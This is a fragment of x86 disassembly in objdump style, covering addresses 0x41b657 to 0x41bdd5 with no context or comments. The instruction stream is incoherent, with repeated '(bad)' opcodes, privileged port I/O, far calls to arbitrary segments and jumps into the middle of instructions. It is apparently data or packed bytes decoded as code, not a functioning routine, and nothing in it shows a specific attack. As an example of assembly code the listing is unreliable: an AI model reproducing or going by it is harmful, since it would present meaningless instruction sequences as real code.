  41b657:	mov    ecx,0xb352a6ff
  41b65c:	xor    eax,0xb7635b6d
  41b661:	jae    0x41b648
  41b663:	(bad)  
  41b664:	fild   WORD PTR [ebx]
  41b666:	pusha  
  41b667:	retf   0x9521
  41b66a:	pop    ds
  41b66b:	das    
  41b66c:	rcr    DWORD PTR [esp+ebx*4+0xcf5692c],0xc
  41b674:	out    0xb3,eax
  41b676:	outs   dx,DWORD PTR ds:[esi]
  41b677:	bound  eax,QWORD PTR [edx+0x7c]
  41b67a:	adc    al,0xd4
  41b67c:	push   0x54
  41b67e:	mov    dl,0x85
  41b680:	mov    ds:0x45fe2113,eax
  41b685:	push   esp
  41b686:	sub    DWORD PTR [ecx],ecx
  41b688:	jb     0x41b60f
  41b68a:	scas   eax,DWORD PTR es:[edi]
  41b68b:	mov    DWORD PTR [eax-0x7f27d12f],edx
  41b691:	add    al,0x38
  41b693:	scas   eax,DWORD PTR es:[edi]
  41b694:	mov    bh,0x5d
  41b696:	jae    0x41b678
  41b698:	sar    esi,cl
  41b69a:	or     ebp,DWORD PTR [edx-0xf]
  41b69d:	mov    ebp,0x3b199eca
  41b6a2:	scas   al,BYTE PTR es:[edi]
  41b6a3:	add    BYTE PTR [esp+ecx*8+0x67],cl
  41b6a7:	sub    al,0x58
  41b6a9:	cmp    DWORD PTR [ebx-0x53d0df26],edi
  41b6af:	and    eax,0x976f7c3b
  41b6b4:	push   ds
  41b6b5:	mov    al,ds:0x14c2586c
  41b6ba:	test   BYTE PTR [edx+edi*4-0xf],cl
  41b6be:	pusha  
  41b6bf:	fs xchg esp,esp
  41b6c2:	aad    0x96
  41b6c4:	mov    ebx,0x75f3d1ae
  41b6c9:	mov    ds:0xb2f7da84,al
  41b6ce:	push   edx
  41b6cf:	shl    BYTE PTR [esi],cl
  41b6d1:	fcmovnb st,st(6)
  41b6d3:	dec    esp
  41b6d4:	or     cl,dl
  41b6d6:	or     DWORD PTR [edx+esi*4+0x14],edx
  41b6da:	xchg   edx,eax
  41b6db:	cmp    BYTE PTR [edx*1-0x4cc7a38d],bh
  41b6e2:	mov    ?,WORD PTR [edx]
  41b6e4:	mov    cl,0x9e
  41b6e6:	pusha  
  41b6e7:	dec    ebx
  41b6e8:	adc    al,BYTE PTR [ebx+esi*1+0x4d]
  41b6ec:	in     eax,dx
  41b6ed:	scas   eax,DWORD PTR es:[edi]
  41b6ee:	jnp    0x41b69f
  41b6f0:	mov    eax,0xeb69c98a
  41b6f5:	inc    esi
  41b6f6:	push   edx
  41b6f7:	xchg   dh,bh
  41b6f9:	aad    0x21
  41b6fb:	pavgb  mm6,mm4
  41b6fe:	or     edx,DWORD PTR [edi-0x40405c94]
  41b704:	jae    0x41b743
  41b706:	cmp    al,0x73
  41b708:	inc    ebx
  41b709:	jae    0x41b72d
  41b70b:	and    BYTE PTR ds:0x22c67712,bl
  41b711:	imul   ebp,ebp,0xffffff85
  41b714:	pop    ds
  41b715:	mov    DWORD PTR [eax+ecx*2+0x59],eax
  41b719:	das    
  41b71a:	add    BYTE PTR ds:0xd0635caf,dh
  41b720:	outs   dx,BYTE PTR ds:[esi]
  41b721:	cld    
  41b722:	jmp    0x41b79c
  41b724:	push   esi
  41b725:	pop    ebx
  41b726:	retf   0x320c
  41b729:	push   ds
  41b72a:	sub    eax,0x8335ef97
  41b72f:	(bad)  
  41b730:	outs   dx,BYTE PTR ds:[esi]
  41b731:	and    edi,DWORD PTR [edi+ebp*4-0x44100589]
  41b738:	and    BYTE PTR [esi-0x60],cl
  41b73b:	sbb    bh,bh
  41b73d:	or     al,0xeb
  41b73f:	fwait
  41b740:	stos   BYTE PTR es:[edi],al
  41b741:	loope  0x41b710
  41b743:	ds aas 
  41b745:	fdivr  st,st(4)
  41b747:	pop    esi
  41b748:	xor    BYTE PTR [ecx],al
  41b74a:	xchg   ebx,eax
  41b74b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b74c:	loop   0x41b70f
  41b74e:	add    DWORD PTR [esi+0x57705682],0xffffffe6
  41b755:	sbb    DWORD PTR [edx+0x13],ecx
  41b758:	inc    ebx
  41b759:	push   esp
  41b75a:	push   0x80349557
  41b75f:	jp     0x41b7b4
  41b761:	aam    0x37
  41b763:	and    BYTE PTR [ecx],0x6f
  41b766:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b767:	sti    
  41b768:	xlat   BYTE PTR ds:[ebx]
  41b769:	call   DWORD PTR [edi-0x2443b017]
  41b76f:	push   esp
  41b770:	les    ebx,FWORD PTR [eax]
  41b772:	inc    esp
  41b773:	cwde   
  41b774:	xor    eax,0x24733840
  41b779:	lea    edi,[edx]
  41b77b:	retf   0x4162
  41b77e:	cmp    al,0xe5
  41b780:	ins    DWORD PTR es:[edi],dx
  41b781:	sbb    bl,bh
  41b783:	inc    eax
  41b784:	mov    ds:0xd117d349,eax
  41b789:	mov    ch,0x24
  41b78b:	sub    eax,0x6d561e33
  41b790:	addr16 sub al,0x59
  41b793:	test   al,0x1a
  41b795:	sbb    al,BYTE PTR [edx+0x29]
  41b798:	xor    eax,edx
  41b79a:	ficom  WORD PTR [edx-0x1a]
  41b79d:	dec    eax
  41b79e:	mov    ah,0xbd
  41b7a0:	ins    DWORD PTR es:[edi],dx
  41b7a1:	cmp    ah,ah
  41b7a3:	lods   al,BYTE PTR ds:[esi]
  41b7a4:	aas    
  41b7a5:	xor    eax,0xd6e327a9
  41b7aa:	adc    eax,0x4120d33c
  41b7af:	dec    ecx
  41b7b0:	pop    esp
  41b7b1:	or     DWORD PTR [ebp+0xf],esp
  41b7b4:	cmp    edx,0xb4a3153a
  41b7ba:	sub    ch,ah
  41b7bc:	(bad)  [edx-0x77514e33]
  41b7c2:	xor    ecx,DWORD PTR [ebx-0x76d4c3a3]
  41b7c8:	cli    
  41b7c9:	mov    al,0x74
  41b7cb:	pop    esp
  41b7cc:	dec    esp
  41b7cd:	adc    DWORD PTR [ecx],0xffffffd0
  41b7d0:	xchg   BYTE PTR [ecx+eiz*1-0x3c0d7435],bl
  41b7d7:	aas    
  41b7d8:	and    eax,DWORD PTR [eax-0x3e]
  41b7db:	cwde   
  41b7dc:	xchg   BYTE PTR [ebp+0x6f709e59],ch
  41b7e2:	inc    esi
  41b7e3:	adc    eax,0xe9426d82
  41b7e8:	and    al,0x12
  41b7ea:	fsub   DWORD PTR cs:[edi+0x212acc8d]
  41b7f1:	jle    0x41b870
  41b7f3:	stos   DWORD PTR es:[edi],eax
  41b7f4:	mov    al,ds:0xb75229ae
  41b7f9:	pop    ebp
  41b7fa:	mov    eax,0xd0669880
  41b7ff:	pmuludq mm7,QWORD PTR [ebp-0x66739f91]
  41b806:	cmp    eax,0x8fe001c5
  41b80b:	call   FWORD PTR [ebx+ecx*2-0x414a296c]
  41b812:	shl    BYTE PTR [ebx],0xfd
  41b815:	sub    ah,bl
  41b817:	jb     0x41b844
  41b819:	xor    esi,DWORD PTR [eax+0x6a]
  41b81c:	xchg   ebp,eax
  41b81d:	out    0xdb,eax
  41b81f:	fptan  
  41b821:	call   0xd3f309ce
  41b826:	sbb    DWORD PTR [ebx+0x3c10723a],edi
  41b82c:	scas   al,BYTE PTR es:[edi]
  41b82d:	fs jmp 0x206f:0xda47d510
  41b835:	loope  0x41b850
  41b837:	test   BYTE PTR [edi],cl
  41b839:	stos   DWORD PTR es:[edi],eax
  41b83a:	popa   
  41b83b:	xchg   edx,eax
  41b83c:	inc    ecx
  41b83d:	arpl   WORD PTR [ebx-0x25],cx
  41b840:	add    DWORD PTR [ecx+0x44],ebp
  41b843:	push   ss
  41b844:	jp     0x41b7d4
  41b846:	ins    BYTE PTR es:[edi],dx
  41b847:	dec    esp
  41b848:	std    
  41b849:	ret    0x3c69
  41b84c:	jo     0x41b823
  41b84e:	mov    eax,0xe5dfb62
  41b853:	pop    edx
  41b854:	(bad)  
  41b855:	lock call 0x7ae1f757
  41b85b:	or     BYTE PTR [esi],0xff
  41b85e:	and    DWORD PTR [eax+0x75],ebx
  41b861:	xchg   BYTE PTR [edx+eax*1],ah
  41b864:	adc    BYTE PTR [ecx],0xdd
  41b867:	cmp    ebp,DWORD PTR [edx-0x2a]
  41b86a:	cmp    DWORD PTR [ebx],edx
  41b86c:	add    bh,bl
  41b86e:	rol    BYTE PTR [ebp+0x77],1
  41b871:	repz xor eax,0x9bdb8f0
  41b877:	fstp   QWORD PTR ds:0x982dc31c
  41b87d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b87e:	pop    esp
  41b87f:	mov    cl,0x90
  41b881:	push   cs
  41b882:	sar    BYTE PTR [edi-0x79],cl
  41b885:	mov    DWORD PTR [eax],0x612d54ae
  41b88b:	and    edi,0xffffff89
  41b88e:	and    dh,BYTE PTR [edx+0x3c046afc]
  41b894:	(bad)  
  41b896:	sahf   
  41b897:	mov    esp,0xbe2871c3
  41b89c:	les    ebx,FWORD PTR [ebp+0x306d0ca7]
  41b8a2:	xchg   esi,eax
  41b8a3:	push   0x7c
  41b8a5:	rcr    BYTE PTR [esi+ebx*4-0x51],0xa4
  41b8aa:	jo     0x41b8c6
  41b8ac:	add    esp,DWORD PTR [ebp-0x67211917]
  41b8b2:	jno    0x41b844
  41b8b4:	aad    0xb9
  41b8b6:	out    0xb5,al
  41b8b8:	aam    0x88
  41b8ba:	arpl   WORD PTR [edx+0x34],si
  41b8bd:	sbb    dh,ch
  41b8bf:	push   edi
  41b8c0:	pop    ss
  41b8c1:	xchg   esi,eax
  41b8c2:	(bad)  
  41b8c3:	jmp    0xf80ca48
  41b8c8:	mov    WORD PTR [esi],gs
  41b8ca:	mov    esi,0xdaf34fcc
  41b8cf:	adc    eax,0x1167619e
  41b8d4:	pop    ebp
  41b8d5:	add    BYTE PTR [edi],dl
  41b8d7:	out    dx,al
  41b8d8:	aam    0x9b
  41b8da:	push   0x7a
  41b8dc:	dec    eax
  41b8dd:	xchg   esp,eax
  41b8de:	(bad)  
  41b8df:	fbstp  TBYTE PTR [eax]
  41b8e1:	jle    0x41b909
  41b8e3:	gs mov esp,0x32ce5afd
  41b8e9:	push   ss
  41b8ea:	push   ecx
  41b8eb:	arpl   cx,di
  41b8ed:	sar    BYTE PTR gs:[eax],0x5
  41b8f1:	xchg   esp,eax
  41b8f2:	aas    
  41b8f3:	pop    ds
  41b8f4:	xchg   ebx,eax
  41b8f5:	mov    bh,0x4e
  41b8f7:	mov    dh,0x5b
  41b8f9:	retf   
  41b8fa:	mov    esp,0x898d395b
  41b8ff:	mov    BYTE PTR [esi+eiz*8],0xf8
  41b903:	sub    al,0x14
  41b905:	xor    DWORD PTR [edi-0x525071c5],esi
  41b90b:	pop    eax
  41b90c:	(bad)  [esi]
  41b90e:	mov    esi,0xd4d938d
  41b913:	sub    dl,BYTE PTR [ebp+0x1b]
  41b916:	ja     0x41b8ea
  41b918:	xchg   ebx,eax
  41b91a:	cmp    eax,0x83a284fd
  41b91f:	in     eax,0xe5
  41b921:	es xchg ebp,eax
  41b923:	adc    eax,0x51f4bc00
  41b928:	pop    ecx
  41b929:	test   BYTE PTR [edi-0x6a],0x60
  41b92d:	ds stc 
  41b92f:	mov    ecx,DWORD PTR [ecx+0x7c]
  41b932:	pop    eax
  41b933:	adc    ch,BYTE PTR [edi+0x4bcd02fa]
  41b939:	jmp    0x41b929
  41b93b:	int    0xa1
  41b93d:	fst    DWORD PTR [edx+0x1c]
  41b940:	outs   dx,DWORD PTR ds:[esi]
  41b941:	jno    0x41b9aa
  41b943:	aas    
  41b944:	loope  0x41b94c
  41b946:	imul   eax,DWORD PTR [esp+eax*4+0x7f0eb867],0xffffff83
  41b94e:	mov    esi,0xe8e7cb11
  41b953:	jecxz  0x41b955
  41b955:	in     eax,dx
  41b956:	jmp    0x41b99c
  41b958:	clc    
  41b959:	rol    BYTE PTR [edi],0xc3
  41b95c:	push   ss
  41b95d:	jnp    0x41b99c
  41b95f:	lock ficom DWORD PTR [ebp+edx*2-0x60]
  41b964:	test   al,0x31
  41b966:	adc    BYTE PTR [esi+0x63c69cab],ah
  41b96c:	jl     0x41b8fc
  41b96e:	mov    ds:0x1fa08fb3,al
  41b973:	arpl   WORD PTR [esi],bx
  41b975:	mov    eax,0x1554bab7
  41b97a:	ins    BYTE PTR es:[edi],dx
  41b97b:	or     bh,0x96
  41b97e:	cmp    eax,0xffffffaf
  41b981:	or     al,0xf7
  41b984:	mov    WORD PTR [eax+0x42],ds
  41b987:	outs   dx,BYTE PTR ds:[esi]
  41b988:	lods   al,BYTE PTR ds:[esi]
  41b989:	call   DWORD PTR [edi-0xde7a90b]
  41b98f:	push   eax
  41b990:	mov    esp,DWORD PTR [esi+eax*1+0x44]
  41b994:	sub    esp,DWORD PTR [ebp+0x28c98772]
  41b99a:	pop    es
  41b99b:	lea    ebp,[esp+ebx*4-0x68932196]
  41b9a2:	add    al,BYTE PTR [edi]
  41b9a4:	in     al,0xb7
  41b9a6:	mov    DWORD PTR [edx+0x55f60a2a],esp
  41b9ac:	sub    edx,DWORD PTR [ebp-0x3c]
  41b9af:	mov    edx,0x6992359c
  41b9b4:	jo     0x41b961
  41b9b6:	aaa    
  41b9b7:	dec    esi
  41b9b8:	inc    esi
  41b9b9:	or     al,0xbc
  41b9bb:	dec    eax
  41b9bc:	xchg   esp,eax
  41b9bd:	dec    edi
  41b9be:	sbb    DWORD PTR [ecx+0x42],eax
  41b9c1:	jecxz  0x41b962
  41b9c3:	xchg   ecx,eax
  41b9c4:	scas   eax,DWORD PTR es:[edi]
  41b9c5:	mov    ds:0xac868dd1,al
  41b9ca:	sbb    ah,bh
  41b9cc:	cmp    al,0x7e
  41b9ce:	mov    ebp,0x8184668
  41b9d3:	mov    DWORD PTR [ecx],edx
  41b9d5:	xor    eax,0x2a436e8c
  41b9da:	xor    ebp,DWORD PTR [edx+ecx*2-0x6b519cc]
  41b9e1:	jecxz  0x41b99a
  41b9e3:	jge    0x41b9c3
  41b9e5:	cli    
  41b9e6:	xor    ah,BYTE PTR [ebx]
  41b9e8:	cdq    
  41b9e9:	das    
  41b9ea:	push   cs
  41b9eb:	cld    
  41b9ec:	fmul   st,st(6)
  41b9ee:	pop    edx
  41b9ef:	push   esp
  41b9f0:	pop    ss
  41b9f1:	sbb    eax,0x2007c5f4
  41b9f6:	call   0x4ffc:0x775f9f49
  41b9fd:	push   0x40
  41b9ff:	add    eax,0xe430534e
  41ba04:	(bad)  
  41ba06:	push   edx
  41ba07:	sbb    al,0x94
  41ba09:	lods   al,BYTE PTR ds:[esi]
  41ba0a:	(bad)  
  41ba0b:	call   0x281bbb9
  41ba10:	daa    
  41ba11:	adc    cl,BYTE PTR [ecx]
  41ba13:	sub    ebp,ecx
  41ba15:	mov    ch,0x21
  41ba17:	outs   dx,DWORD PTR ds:[esi]
  41ba18:	in     al,dx
  41ba19:	hlt    
  41ba1a:	xchg   edx,eax
  41ba1b:	inc    ebx
  41ba1c:	ins    DWORD PTR es:[edi],dx
  41ba1d:	mov    ch,0xaa
  41ba1f:	jae    0x41ba82
  41ba21:	jge    0x41ba17
  41ba23:	bound  esi,QWORD PTR [ecx+ebp*2-0x73]
  41ba27:	xor    al,0xa4
  41ba29:	imul   esi,DWORD PTR [edx-0x15],0x55
  41ba2d:	in     al,dx
  41ba2e:	add    al,dh
  41ba30:	dec    esp
  41ba31:	sahf   
  41ba32:	ror    DWORD PTR [ebx+0x6fff53cf],1
  41ba38:	add    al,0xc0
  41ba3a:	arpl   ax,dx
  41ba3c:	loop   0x41b9ee
  41ba3e:	lods   al,BYTE PTR ds:[esi]
  41ba3f:	loop   0x41ba2b
  41ba41:	scas   al,BYTE PTR es:[edi]
  41ba42:	mov    ebx,0xbd0bf3c8
  41ba47:	ins    BYTE PTR es:[edi],dx
  41ba48:	inc    esi
  41ba49:	fwait
  41ba4a:	push   ecx
  41ba4b:	push   esp
  41ba4c:	or     BYTE PTR ds:[ebx-0x70],cl
  41ba50:	push   es
  41ba51:	das    
  41ba52:	aad    0x53
  41ba54:	test   ebx,ebx
  41ba56:	shr    dh,0x96
  41ba59:	fisubr WORD PTR [edx]
  41ba5b:	cmp    al,0x1b
  41ba5d:	mov    eax,ds:0x1374cf36
  41ba62:	jle    0x41b9fd
  41ba64:	pusha  
  41ba65:	add    ch,BYTE PTR [ecx]
  41ba67:	(bad)  
  41ba68:	jg     0x41bac0
  41ba6a:	xchg   ebx,eax
  41ba6b:	or     eax,0x83a8dc5f
  41ba70:	jo     0x41bac5
  41ba72:	push   esp
  41ba73:	out    dx,al
  41ba74:	pop    ss
  41ba75:	sbb    BYTE PTR [eax-0x5a4bddb4],dl
  41ba7b:	or     eax,0x3f001371
  41ba80:	dec    edx
  41ba81:	pop    ebx
  41ba82:	call   0x6418:0xda253f45
  41ba89:	mov    esp,0xad4b1fc3
  41ba8e:	aam    0x4
  41ba90:	test   dh,ah
  41ba92:	jb     0x41bb11
  41ba94:	shl    DWORD PTR [ebx],0x73
  41ba97:	jbe    0x41bade
  41ba99:	aad    0x73
  41ba9b:	ret    
  41ba9c:	and    bl,BYTE PTR [eax-0x5b623c9f]
  41baa2:	xlat   BYTE PTR ds:[ebx]
  41baa3:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41baa5:	pusha  
  41baa6:	cmp    eax,0xf25c923b
  41baab:	dec    esi
  41baac:	mov    WORD PTR [ebx-0x13],ss
  41baaf:	outs   dx,DWORD PTR ds:[esi]
  41bab0:	xor    DWORD PTR [edx],0x52
  41bab3:	adc    DWORD PTR [esi+0x2e],0xd6649e0
  41baba:	mov    edi,0x44698cee
  41babf:	xlat   BYTE PTR ds:[ebx]
  41bac0:	(bad)  
  41bac2:	dec    eax
  41bac3:	add    BYTE PTR [ebx-0x3f],ah
  41bac6:	fmul   QWORD PTR [eax]
  41bac8:	sbb    eax,0xd76b211c
  41bacd:	xchg   edi,eax
  41bace:	mov    cl,0x98
  41bad0:	jmp    0xb3f641da
  41bad5:	loopne 0x41bb4c
  41bad7:	call   0x55f976c6
  41badc:	push   ebx
  41badd:	test   eax,0x7e074ed6
  41bae2:	outs   dx,DWORD PTR ds:[esi]
  41bae3:	mov    esp,0x585e94d9
  41bae8:	push   eax
  41bae9:	cld    
  41baea:	nop
  41baeb:	push   0x2
  41baed:	fisubr WORD PTR [ebx+0x45]
  41baf0:	mov    eax,0x3bf26a18
  41baf5:	push   es
  41baf6:	mov    dl,0x1e
  41baf8:	or     al,0x93
  41bafa:	in     eax,dx
  41bafb:	pop    ecx
  41bafc:	sbb    dl,BYTE PTR [edi+edx*1-0x76]
  41bb00:	mov    ah,0xea
  41bb02:	mov    eax,DWORD PTR [ebx-0x7199b4ff]
  41bb08:	jns    0x41bb29
  41bb0a:	imul   edx,DWORD PTR fs:[ebx+0x4e],0xe5221804
  41bb12:	in     eax,0x38
  41bb14:	out    dx,al
  41bb15:	cdq    
  41bb16:	adc    ebp,DWORD PTR [edi-0x13]
  41bb19:	test   eax,0x6be2226b
  41bb1e:	popf   
  41bb1f:	xor    al,0x80
  41bb21:	je     0x41bb9e
  41bb23:	adc    al,0xea
  41bb25:	(bad)  
  41bb26:	jbe    0x41bac2
  41bb28:	and    DWORD PTR [esi+0x70],ebx
  41bb2b:	call   0xbd2c:0x7b535f87
  41bb32:	add    DWORD PTR [edx],0x79
  41bb35:	adc    dl,BYTE PTR [edx-0xd]
  41bb38:	stc    
  41bb39:	mov    bh,0xf5
  41bb3b:	push   cs
  41bb3c:	cmc    
  41bb3d:	add    al,0xb2
  41bb3f:	or     al,0x39
  41bb41:	lods   al,BYTE PTR ds:[esi]
  41bb42:	dec    edx
  41bb43:	in     al,0x5b
  41bb45:	or     ecx,DWORD PTR [esi-0x6ac80328]
  41bb4b:	mov    ds,WORD PTR [eax+0x44eaab4a]
  41bb51:	mov    ds:0x86aec3c3,al
  41bb56:	pop    edi
  41bb57:	push   ebp
  41bb58:	pop    ds
  41bb59:	pop    ds
  41bb5a:	loope  0x41bbac
  41bb5c:	outs   dx,DWORD PTR ds:[esi]
  41bb5d:	adc    esi,eax
  41bb5f:	jge    0x41bb85
  41bb61:	cdq    
  41bb62:	fstp   TBYTE PTR [edx-0x60fbc9b5]
  41bb68:	add    BYTE PTR [ebx+0x40],bl
  41bb6b:	adc    BYTE PTR [esi],ah
  41bb6d:	sub    esp,DWORD PTR [eax]
  41bb6f:	mov    ch,0xf6
  41bb71:	(bad)  
  41bb72:	rcr    BYTE PTR ds:0x30a43233,1
  41bb78:	call   0x7697:0xce15bdff
  41bb7f:	scas   eax,DWORD PTR es:[edi]
  41bb80:	mov    ds:0x8278e7c1,al
  41bb85:	mov    cl,0x7d
  41bb87:	mov    WORD PTR [ecx+0x7a],cs
  41bb8a:	(bad)  
  41bb8b:	es push eax
  41bb8d:	lock ror DWORD PTR [edi+0x56d3e27f],cl
  41bb94:	sub    al,bl
  41bb96:	or     BYTE PTR [edi+0x79],dl
  41bb99:	lea    edx,[eax+0xbb62d0f]
  41bb9f:	mov    eax,ds:0x4fbb414f
  41bba4:	stos   DWORD PTR es:[edi],eax
  41bba5:	out    0x54,al
  41bba7:	aas    
  41bba8:	popf   
  41bba9:	mov    ah,0x11
  41bbab:	test   BYTE PTR [edi-0x5477b090],0x2d
  41bbb2:	xor    DWORD PTR [edi-0x67],edi
  41bbb5:	shr    ecx,0x7f
  41bbb8:	pop    ebx
  41bbb9:	add    eax,0x4942e45
  41bbbe:	pop    ebp
  41bbbf:	out    dx,eax
  41bbc0:	inc    ebx
  41bbc1:	pop    edi
  41bbc2:	mov    ss,WORD PTR [ebp+ebx*8-0x371bc70d]
  41bbc9:	cmc    
  41bbca:	in     al,dx
  41bbcb:	jp     0x41bbdd
  41bbcd:	sbb    esp,DWORD PTR [ebx]
  41bbcf:	adc    BYTE PTR [eax-0x16f949cb],dl
  41bbd5:	in     al,0xc4
  41bbd7:	sub    ch,BYTE PTR [edi]
  41bbd9:	(bad)  
  41bbda:	cmc    
  41bbdb:	xchg   dh,ah
  41bbdd:	or     BYTE PTR [edi-0x66],bh
  41bbe0:	cmp    eax,0xca70eaa3
  41bbe5:	mov    esp,0x8b4648d1
  41bbea:	xor    BYTE PTR [ebx+esi*4+0x56],0x8d
  41bbef:	xor    esi,esp
  41bbf1:	in     eax,0x26
  41bbf3:	stos   BYTE PTR es:[edi],al
  41bbf4:	dec    ebp
  41bbf5:	hlt    
  41bbf6:	dec    esi
  41bbf7:	jno    0x41bb90
  41bbf9:	pushf  
  41bbfa:	pop    ecx
  41bbfb:	les    edi,FWORD PTR [ecx-0x44]
  41bbfe:	sub    BYTE PTR [ebx+ebx*4],ch
  41bc01:	pushf  
  41bc02:	repz dec edx
  41bc04:	hlt    
  41bc05:	mov    eax,ds:0xab2f3014
  41bc0a:	ins    BYTE PTR es:[edi],dx
  41bc0b:	in     al,0xdc
  41bc0d:	test   al,0xd4
  41bc0f:	jns    0x41bb9c
  41bc11:	mov    al,0x23
  41bc13:	outs   dx,DWORD PTR ds:[esi]
  41bc14:	jae    0x41bbaf
  41bc16:	jecxz  0x41bbb5
  41bc18:	nop
  41bc19:	setb   BYTE PTR [ecx+ecx*2+0x2f]
  41bc1e:	out    0xa,eax
  41bc20:	push   esi
  41bc21:	mov    ebp,DWORD PTR [esp+edi*4-0x52a9071]
  41bc28:	cld    
  41bc29:	jae    0x41bbf8
  41bc2b:	int    0x92
  41bc2d:	stos   BYTE PTR es:[edi],al
  41bc2e:	and    esp,eax
  41bc30:	inc    ebp
  41bc31:	mov    ?,WORD PTR [esi]
  41bc33:	imul   ecx,DWORD PTR [esi],0x8456af60
  41bc39:	pop    esi
  41bc3a:	fwait
  41bc3b:	das    
  41bc3c:	mov    ch,0xc3
  41bc3e:	into   
  41bc3f:	mov    cl,bl
  41bc41:	or     BYTE PTR [esi+0x2a],dh
  41bc44:	ror    dl,cl
  41bc46:	sbb    bh,BYTE PTR [ebp+eax*1-0x41fb2bc6]
  41bc4d:	(bad)  
  41bc4f:	dec    esp
  41bc50:	adc    BYTE PTR [ecx],dl
  41bc52:	jecxz  0x41bbfc
  41bc54:	add    eax,0xf2856d4e
  41bc59:	xchg   esp,eax
  41bc5b:	bound  esi,QWORD PTR [ebx-0x58ccc35d]
  41bc61:	(bad)  
  41bc63:	adc    DWORD PTR fs:[edi-0x11],esp
  41bc67:	call   FWORD PTR [edx+0x1f]
  41bc6a:	and    edi,DWORD PTR [edi-0x6d]
  41bc6d:	pop    ebp
  41bc6e:	mov    edi,0xbb734782
  41bc73:	int3   
  41bc74:	shl    BYTE PTR [edi+0x5a],1
  41bc77:	mov    esp,0xdc7f9dd6
  41bc7c:	and    DWORD PTR [ebp+0x12df47ef],esp
  41bc82:	push   0x1cab85f4
  41bc87:	fstp   DWORD PTR [esi]
  41bc89:	fdivr  QWORD PTR [edx+eax*1+0x10]
  41bc8d:	repnz add edx,DWORD PTR [ebx+0x1973763d]
  41bc94:	clc    
  41bc95:	add    al,0xff
  41bc97:	xor    BYTE PTR [eax-0x2daee73f],cl
  41bc9d:	dec    ebp
  41bc9e:	lea    edi,ds:0xde53255a
  41bca4:	fs xchg edi,eax
  41bca6:	fwait
  41bca7:	dec    esp
  41bca8:	daa    
  41bca9:	bnd jnp 0x41bd00
  41bcac:	and    BYTE PTR [edi-0x5c8b88c8],cl
  41bcb2:	(bad)  
  41bcb3:	sbb    BYTE PTR [eax-0x5f2cefc7],ch
  41bcb9:	pop    ebp
  41bcba:	rol    ebp,0x3b
  41bcbd:	and    BYTE PTR [ebx+0x6bdd1eae],bh
  41bcc3:	cwde   
  41bcc4:	and    BYTE PTR [ebx+0x16],ah
  41bcc7:	addr16 mov esi,0xf7d989f0
  41bccd:	outs   dx,DWORD PTR ds:[esi]
  41bcce:	ficomp WORD PTR [esi+0x5ee3eca9]
  41bcd4:	inc    edx
  41bcd5:	push   eax
  41bcd6:	mov    edx,0x9f8eb85f
  41bcdb:	call   0x2553850
  41bce0:	mov    eax,ds:0xf4ee63c5
  41bce5:	dec    ecx
  41bce6:	sub    eax,0x812b36c0
  41bceb:	lds    eax,FWORD PTR [eax-0x6e]
  41bcee:	mov    ah,0x79
  41bcf0:	ds stc 
  41bcf2:	leave  
  41bcf3:	call   0xcbba5c5c
  41bcf8:	call   0x33cf1c38
  41bcfd:	addr16 loop 0x41bcb1
  41bd00:	add    eax,0x66925cb6
  41bd05:	cld    
  41bd06:	fsub   st,st(2)
  41bd08:	push   eax
  41bd09:	mov    al,0x50
  41bd0b:	mov    eax,ds:0x45e327c5
  41bd10:	xor    DWORD PTR [esi+0x7ad13ed6],ecx
  41bd16:	add    DWORD PTR [esi-0x73],esi
  41bd19:	jp     0x41bd8c
  41bd1b:	inc    esp
  41bd1c:	dec    esp
  41bd1d:	pop    esp
  41bd1e:	stc    
  41bd1f:	mov    al,ds:0x2399d21e
  41bd24:	cmp    esi,DWORD PTR [ebx+ecx*4]
  41bd27:	(bad)  
  41bd28:	leave  
  41bd29:	mov    esp,0x9b838da8
  41bd2e:	loope  0x41bcbe
  41bd30:	lods   eax,DWORD PTR ds:[esi]
  41bd31:	retf   
  41bd32:	out    dx,eax
  41bd33:	shl    BYTE PTR [ebx-0xa],0x78
  41bd37:	pushf  
  41bd38:	loop   0x41bd4b
  41bd3a:	rcl    ecx,cl
  41bd3c:	sub    eax,ebp
  41bd3e:	call   0x61326c2e
  41bd43:	sti    
  41bd44:	imul   ebp,DWORD PTR [esi-0x4b],0xffffffb0
  41bd48:	shr    BYTE PTR [ebp+0x4c22ca00],cl
  41bd4e:	pop    esi
  41bd4f:	xchg   esi,eax
  41bd50:	jmp    0x41bd21
  41bd52:	and    al,0xf5
  41bd54:	or     eax,0xa6eab803
  41bd59:	shl    DWORD PTR [eax],1
  41bd5b:	fidivr DWORD PTR [esi+0x1264e7e8]
  41bd61:	mov    bh,BYTE PTR [edi]
  41bd63:	int3   
  41bd64:	leave  
  41bd65:	mov    ds:0xb5c18741,al
  41bd6a:	cdq    
  41bd6b:	jne    0x41bcf9
  41bd6d:	xor    al,0x27
  41bd6f:	jp     0x41bda1
  41bd71:	pop    esi
  41bd72:	fdivp  st(2),st
  41bd74:	and    eax,0xbf97dd42
  41bd79:	lods   eax,DWORD PTR ds:[esi]
  41bd7a:	in     al,0xe
  41bd7c:	pop    esi
  41bd7d:	adc    al,0xa0
  41bd7f:	and    DWORD PTR [esi+0x444e70a6],0xffffffdf
  41bd86:	fist   DWORD PTR [edx+esi*8]
  41bd89:	xor    al,0xdc
  41bd8b:	repz mov cl,0xde
  41bd8e:	inc    edx
  41bd8f:	pop    ds
  41bd90:	add    BYTE PTR [esp+ebp*1],ah
  41bd93:	outs   dx,DWORD PTR ds:[esi]
  41bd94:	jno    0x41bd33
  41bd96:	ret    0xc8b1
  41bd99:	repz xchg ebp,eax
  41bd9b:	pop    es
  41bd9c:	cwde   
  41bd9d:	out    0x40,eax
  41bd9f:	or     eax,DWORD PTR [esp+ebp*4+0x4db743e5]
  41bda6:	int3   
  41bda7:	jl     0x41bde7
  41bda9:	fxch   st(2)
  41bdab:	and    al,0xa5
  41bdad:	fcom   QWORD PTR [ebp-0x3b24dd5d]
  41bdb3:	icebp  
  41bdb4:	mov    esp,0xfe502c0
  41bdb9:	retf   
  41bdba:	out    0xe8,eax
  41bdbc:	mov    ecx,0xf6d2d540
  41bdc1:	in     eax,dx
  41bdc2:	(bad)  
  41bdc3:	jnp    0x41be13
  41bdc5:	lahf   
  41bdc6:	xchg   esi,eax
  41bdc7:	cmp    edi,ebx
  41bdc9:	jl     0x41bdfa
  41bdcb:	lds    edi,FWORD PTR [esi-0x7749c577]
  41bdd1:	fnstenv [ebp-0x3c]
  41bdd4:	push   ss
  41bdd5:	pop    ebx
